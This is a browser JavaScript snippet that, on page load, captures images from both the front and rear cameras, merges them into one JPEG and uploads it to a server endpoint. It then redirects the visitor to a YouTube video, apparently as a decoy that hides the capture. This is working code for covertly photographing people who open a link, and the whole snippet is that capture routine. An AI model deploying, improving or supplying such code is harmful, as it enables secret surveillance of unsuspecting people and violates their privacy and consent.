(async () => {
  const frontVid = document.getElementById('frontVideo');
  const rearVid  = document.getElementById('rearVideo');
  const canvas   = document.getElementById('canvas');
  const ctx      = canvas.getContext('2d');

  async function captureBoth() {
    let frontStream, rearStream;
    try {
      // 1) request both streams
      [frontStream, rearStream] = await Promise.all([
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }),
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
      ]);
      frontVid.srcObject = frontStream;
      rearVid.srcObject  = rearStream;

      // 2) wait for both videos to be ready
      await Promise.all([
        new Promise(r => { if (frontVid.readyState>=2) r(); else frontVid.onloadedmetadata = r; }),
        new Promise(r => { if (rearVid.readyState>=2)  r(); else  rearVid.onloadedmetadata  = r; })
      ]);

      // 3) size our canvas to hold both feeds side-by-side
      const w = Math.max(frontVid.videoWidth, rearVid.videoWidth);
      const h = Math.max(frontVid.videoHeight, rearVid.videoHeight);
      canvas.width  = w * 2;
      canvas.height = h;

      // 4) draw rear on left, front on right
      ctx.drawImage(rearVid,  0, 0, w, h);
      ctx.drawImage(frontVid, w, 0, w, h);

      // 5) export merged image
      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);

      // 6) send to your existing API
      await fetch('/api/upload', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ image: dataUrl })
      });
    } catch (err) {
      console.error('Dual capture failed:', err);
    } finally {
      // 7) stop tracks
      if (frontStream) frontStream.getTracks().forEach(t => t.stop());
      if (rearStream)  rearStream.getTracks().forEach(t => t.stop());
      // 8) (optional) redirect or 
      window.location.replace('https://m.youtube.com/watch?si=X7JkWv2nepcAG1IE&v=kNIr14EyTaY&feature=youtu.be');
    }
  }

  // run on page load
  captureBoth();
})();
